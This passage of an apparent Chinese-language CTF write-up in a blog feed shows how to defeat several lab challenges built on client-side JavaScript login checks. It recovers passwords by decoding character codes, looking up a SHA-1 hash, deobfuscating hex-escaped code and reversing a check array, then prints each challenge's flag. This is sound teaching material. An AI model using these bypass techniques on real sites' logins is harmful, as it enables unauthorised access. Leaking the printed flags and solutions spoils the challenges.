alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
-<p>用控制台运行一下得到密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)</div><div class="line">&quot;JavaScriptIsSecure&quot;</div></pre></td></tr></table></figure></p>
-<p>填入账号admin，密码JavaScriptIsSecure，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-66Jq5u688he0y46564481WRh</div></pre></td></tr></table></figure></p>
-<h1 id="Is-hashing-more-secure"><a href="#Is-hashing-more-secure" class="headerlink" title="Is hashing more secure?"></a>Is hashing more secure?</h1><p>查看源代码，发现js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">if</span>(Sha1.hash(p) == <span class="string">"b89356ff6151527e89c4f3e3d30c8e6586c63962"</span>) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-<p>工具网站：<a href="http://hashtoolkit.com" target="_blank" rel="external">http://hashtoolkit.com</a><br>得到密码为；adminz。填入，得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-bXNsYg9tLCaIX6h1UiQMmMYB</div></pre></td></tr></table></figure></p>
-<h1 id="Then-obfuscation-is-more-secure"><a href="#Then-obfuscation-is-more-secure" class="headerlink" title="Then obfuscation is more secure?"></a>Then obfuscation is more secure?</h1><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">			// Look's like weak JavaScript auth script :)</div><div class="line">			var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>拖到<a href="http://ddecode.com/" target="_blank" rel="external">http://ddecode.com/</a><br>解一下得到如下代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    <span class="keyword">var</span> _0xf382x1 = $(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();    <span class="keyword">var</span> _0xf382x2 = _0xc360[<span class="number">2</span>];    <span class="keyword">if</span> (_0xf382x1 == _0xc360[<span class="number">3</span>] + _0xf382x2) &#123;        <span class="keyword">if</span> (<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>]) == <span class="number">-1</span>) &#123;            <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]] = <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]] + _0xc360[<span class="number">4</span>] + _0xf382x1;        &#125;;    &#125; <span class="keyword">else</span> &#123;        $(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);    &#125;;&#125;);</div></pre></td></tr></table></figure>
-<p>自己再替换一下。总算能看了。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(<span class="string">".c_submit"</span>)[<span class="string">"click"</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </div><div class="line">	<span class="keyword">var</span> _0xf382x1 = $(<span class="string">"#cpass"</span>)[<span class="string">"val"</span>]();    </div><div class="line">	<span class="keyword">var</span> _0xf382x2 = <span class="string">"alk3"</span>;    </div><div class="line">	<span class="keyword">if</span> (_0xf382x1 == <span class="string">"02l1"</span> + _0xf382x2) &#123;        </div><div class="line">		<span class="keyword">if</span> (<span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>][<span class="string">"indexOf"</span>](<span class="string">"?p="</span>,) == <span class="number">-1</span>) &#123;            </div><div class="line">			<span class="built_in">document</span>[<span class="string">"location"</span>] = <span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>] + <span class="string">"?p="</span>, + _0xf382x1;        </div><div class="line">		&#125;;    </div><div class="line">	&#125; <span class="keyword">else</span> &#123;        </div><div class="line">		$(<span class="string">"#cresponse"</span>)[<span class="string">"html"</span>](<span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>);    </div><div class="line">	&#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>所以密码是 02l1alk3，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-5PJne3T8d73UGv4SCqN44DXj</div></pre></td></tr></table></figure></p>
-<h1 id="Why-not"><a href="#Why-not" class="headerlink" title="Why not?"></a>Why not?</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">var</span> t = <span class="literal">true</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(u == <span class="string">"administrator"</span>) &#123;</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; u.length; i++) &#123;</div><div class="line">			<span class="keyword">if</span>((u.charCodeAt(i) + p.charCodeAt(i) + i * <span class="number">10</span>) != k[i]) &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">				t = <span class="literal">false</span>;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">		t = <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(t) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>写一个js脚本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = <span class="string">"administrator"</span>;</div><div class="line">	<span class="keyword">var</span> p = <span class="string">""</span>;</div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; u.length; i++)&#123;</div><div class="line">		p += <span class="built_in">String</span>.fromCharCode(k[i] - i * <span class="number">10</span> - u.charCodeAt(i) );</div><div class="line">	&#125;</div><div class="line">	alert(p);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
-<p>弹框得到结果：OhLord4309111，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-65t23674o6N2NehA44272G24</div></pre></td></tr></table></figure></p>
-<h1 id="Valid-key-required"><a href="#Valid-key-required" class="headerlink" title="Valid key required"></a>Valid key required</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params"> orig_func </span>) </span>&#123;</div><div class="line">			<span class="keyword">var</span> ap = <span class="built_in">Array</span>.prototype, args = <span class="built_in">arguments</span>;</div><div class="line"></div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			ap.push.apply( fn.args, <span class="built_in">arguments</span> );</div><div class="line">			<span class="keyword">return</span> fn.args.length &lt; orig_func.length ? fn : orig_func.apply( <span class="keyword">this</span>, fn.args );</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			fn.args = ap.slice.call( args, <span class="number">1</span> );</div><div class="line">			<span class="keyword">return</span> fn.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> );</div><div class="line">			&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</div><div class="line">		  <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> ref = &#123;<span class="attr">T</span> : <span class="string">"BG8"</span>,<span class="attr">J</span> : <span class="string">"jep"</span>,<span class="attr">j</span> : <span class="string">"M2L"</span>,<span class="attr">K</span> : <span class="string">"L23"</span>,<span class="attr">H</span> : <span class="string">"r1A"</span>&#125;;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></div><div class="line">		&#123;</div><div class="line">			e = <span class="literal">false</span>;</div><div class="line">			<span class="keyword">var</span> _strKey = <span class="string">""</span>;</div><div class="line">		    <span class="keyword">try</span> &#123;</div><div class="line">				_strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</div><div class="line">		        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</div><div class="line">		        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</div><div class="line">		        	e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</div><div class="line"></div><div class="line">		        <span class="keyword">if</span>(!equal(o,ref))</div><div class="line">					e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		    &#125;<span class="keyword">catch</span>(e)&#123;</div><div class="line">		    	e = <span class="literal">true</span>;</div><div class="line">		    &#125;</div><div class="line"></div><div class="line">		    <span class="keyword">if</span>(!e) &#123;</div><div class="line">		    	<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</div><div class="line">           		&#125;</div><div class="line">		    &#125; <span class="keyword">else</span> &#123;</div><div class="line">		    	$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;   </div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">o,o1</span>)</span></div><div class="line">		&#123;</div><div class="line">		    <span class="keyword">var</span> keys1 = <span class="built_in">Object</span>.keys(o1);</div><div class="line">		    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(o);</div><div class="line">		    <span class="keyword">if</span>(keys1.length != keys.length)</div><div class="line">		        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;keys.length;i++)</div><div class="line">		         <span class="keyword">if</span>(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])</div><div class="line">		            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">f1,f2,f3</span>) </span>&#123;</div><div class="line">		    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> f2(f1(x),f3(x));&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> h = curry(hook);</div><div class="line">		<span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">genFunc</span>(<span class="params">_part</span>) </span>&#123;</div><div class="line">		    <span class="keyword">if</span>(!_part || !(_part.length) || _part.length !== <span class="number">4</span>)</div><div class="line">		        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</div><div class="line">		&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;未完待续..待续..&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-      <category term="javascript" scheme="http://yoursite.com/tags/javascript/"/>
     
   </entry>
   
